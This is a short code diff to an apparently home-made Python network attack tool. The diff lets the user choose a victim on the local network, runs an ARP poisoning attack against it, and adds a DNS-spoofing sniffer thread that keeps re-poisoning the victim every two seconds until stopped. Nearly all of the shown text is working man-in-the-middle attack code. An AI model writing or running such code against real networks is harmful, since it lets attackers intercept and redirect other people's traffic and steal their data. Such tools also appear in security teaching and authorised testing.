@@ -5,6 +5,8 @@ from arp_poison import ARPPoisonAttack
 from client import Client
 from netifaces import ifaddresses, AF_INET
 from ipaddress import ip_network
+from dns_spoof import Sniffer
+from time import sleep
 
 from network_scan import NetworkScan
 from utils import stu, uts
@@ -56,5 +58,20 @@ victim = radiolist_dialog(
 )
 
 arpAttack = ARPPoisonAttack(iface, victim, clients)
-
 arpAttack.execute()
+
+sniffer = Sniffer()
+
+print("[*] Start sniffing...")
+sniffer.start()
+
+try:
+    while True:
+        sleep(2)
+        arpAttack.execute()
+except KeyboardInterrupt:
+    print("[*] Stop sniffing")
+    sniffer.join(2.0)
+
+    if sniffer.isAlive():
+        sniffer.socket.close()
